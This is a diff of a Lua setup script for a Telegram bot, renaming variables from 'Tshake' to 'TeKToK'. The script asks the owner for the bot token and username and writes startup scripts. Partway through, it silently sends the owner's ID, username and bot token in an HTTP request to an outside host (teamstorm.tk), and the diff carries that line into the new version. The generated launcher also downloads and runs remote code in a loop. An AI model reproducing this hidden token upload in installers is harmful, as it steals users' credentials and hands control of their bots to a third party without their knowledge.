@@ -3,20 +3,20 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_Tshake = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_Tshake = function() 
+Server_TeKToK = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_TeKToK = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local Tshake_Info_Sudo = io.open("sudo.lua", 'w')
-Tshake_Info_Sudo:write([[
+local TeKToK_Info_Sudo = io.open("sudo.lua", 'w')
+TeKToK_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-Tshake_Info_Sudo:close()
+TeKToK_Info_Sudo:close()
 end  
-if not database:get(Server_Tshake.."Token_Tshake") then
+if not database:get(Server_TeKToK.."Token_TeKToK") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +25,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_Tshake.."Token_Tshake",token)
+database:set(Server_TeKToK.."Token_TeKToK",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,7 +34,7 @@ os.execute('lua run.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_Tshake.."UserName_Tshake") then
+if not database:get(Server_TeKToK.."UserName_TeKToK") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -53,8 +53,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua run.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_Tshake.."UserName_Tshake",Json.Info.Username)
-database:set(Server_Tshake.."Id_Tshake",Json.Info.Id)
+database:set(Server_TeKToK.."UserName_TeKToK",Json.Info.Username)
+database:set(Server_TeKToK.."Id_TeKToK",Json.Info.Id)
 end
 end
 else
@@ -62,14 +62,14 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua run.lua')
 end
-local function Files_Tshake_Info()
-Create_Info(database:get(Server_Tshake.."Token_Tshake"),database:get(Server_Tshake.."Id_Tshake"),database:get(Server_Tshake.."UserName_Tshake"))   
-http.request("http://teamstorm.tk/insert/?id="..database:get(Server_Tshake.."Id_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
-local RunTshake = io.open("TeKToKTeKToK", 'w')
-RunTshake:write([[
+local function Files_TeKToK_Info()
+Create_Info(database:get(Server_TeKToK.."Token_TeKToK"),database:get(Server_TeKToK.."Id_TeKToK"),database:get(Server_TeKToK.."UserName_TeKToK"))   
+http.request("http://teamstorm.tk/insert/?id="..database:get(Server_TeKToK.."Id_TeKToK").."&user="..database:get(Server_TeKToK.."UserName_TeKToK").."&token="..database:get(Server_TeKToK.."Token_TeKToK"))
+local RunTeKToK = io.open("TeKToK", 'w')
+RunTeKToK:write([[
 #!/usr/bin/env bash
 cd $HOME/TeKToK
-token="]]..database:get(Server_Tshake.."Token_Tshake")..[["
+token="]]..database:get(Server_TeKToK.."Token_TeKToK")..[["
 rm -fr TekToK.lua
 wget "https://raw.githubusercontent.com/TeKToKBot/TeKToK/master/TeKToK.lua"
 while(true) do
@@ -77,7 +77,7 @@ rm -fr ../.telegram-cli
 ./tg -s ./TeKToK.lua -p PROFILE --bot=$token
 done
 ]])
-RunTshake:close()
+RunTeKToK:close()
 local RunTs = io.open("tk", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
@@ -85,24 +85,24 @@ cd $HOME/TeKToK
 while(true) do
 rm -fr ../.telegram-cli
 screen -S TeKToK -X kill
-screen -S TeKToK ./Tshake
+screen -S TeKToK ./TeKToK
 done
 ]])
 RunTs:close()
 end
-Files_Tshake_Info()
-database:del(Server_Tshake.."Token_Tshake");database:del(Server_Tshake.."Id_Tshake");database:del(Server_Tshake.."UserName_Tshake")
+Files_TeKToK_Info()
+database:del(Server_TeKToK.."Token_TeKToK");database:del(Server_TeKToK.."Id_TeKToK");database:del(Server_TeKToK.."UserName_TeKToK")
 sudos = dofile('sudo.lua')
 os.execute('./ins.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_Tshake()  
+AutoFiles_TeKToK()  
 var = true
 else   
 f:close()  
-database:del(Server_Tshake.."Token_Tshake");database:del(Server_Tshake.."Id_Tshake");database:del(Server_Tshake.."UserName_Tshake")
+database:del(Server_TeKToK.."Token_TeKToK");database:del(Server_TeKToK.."Id_TeKToK");database:del(Server_TeKToK.."UserName_TeKToK")
 sudos = dofile('sudo.lua')
 os.execute('./ins.sh ins')
 var = false
